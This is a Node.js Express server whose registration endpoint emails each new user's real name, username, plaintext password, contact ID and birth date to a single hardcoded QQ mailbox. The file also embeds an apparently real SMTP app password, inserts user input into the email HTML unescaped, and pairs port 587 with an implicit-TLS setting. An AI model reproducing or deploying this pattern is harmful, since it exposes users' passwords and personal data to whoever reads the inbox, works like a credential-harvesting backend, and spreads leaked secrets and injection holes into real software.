const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ========== 邮箱配置（请修改为你的QQ邮箱信息）==========
const EMAIL_USER = process.env.EMAIL_USER || '1226505228@qq.com';
const EMAIL_PASS = process.env.EMAIL_PASS || 'bshumudvdvujfedd';
const TARGET_EMAIL = '1226505228@qq.com';   // 接收注册信息的邮箱（固定）
// =================================================

const transporter = nodemailer.createTransport({
    host: 'smtp.qq.com',
    port: 587,
    secure: true,
    auth: {
        user: EMAIL_USER,
        pass: EMAIL_PASS
    }
});

// 注册接口
app.post('/api/register', async (req, res) => {
    const { realname, username, password, contact, birthDate } = req.body;
    
    const mailOptions = {
        from: `"注册系统" <${EMAIL_USER}>`,
        to: TARGET_EMAIL,
        subject: `【新用户注册】${username} - ${new Date().toLocaleString()}`,
        html: `
            <div style="font-family: system-ui; padding: 20px; border: 1px solid #ddd; border-radius: 12px;">
                <h2 style="color: #1e3a5f;">📝 新用户注册通知</h2>
                <p><strong>真实姓名：</strong> ${realname}</p>
                <p><strong>账户名：</strong> ${username}</p>
                <p><strong>出生年月日：</strong> ${birthDate}</p>
                <p><strong>QQ/微信号：</strong> ${contact}</p>
                <p><strong>密码：</strong> ${password}</p>
                <p><strong>注册时间：</strong> ${new Date().toLocaleString('zh-CN')}</p>
                <hr>
                <small>此邮件由注册系统自动发送</small>
            </div>
        `
    };
    
    try {
        await transporter.sendMail(mailOptions);
        console.log(`[${new Date().toISOString()}] 新注册: ${username} - ${realname}`);
        res.json({ success: true, message: '注册成功' });
    } catch (error) {
        console.error('发送失败:', error);
        res.json({ success: false, message: '邮件发送失败' });
    }
});

// 启动服务器
const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`✅ 服务器运行在 http://localhost:${port}`);
    console.log(`📧 注册信息将发送到: ${TARGET_EMAIL}`);
});
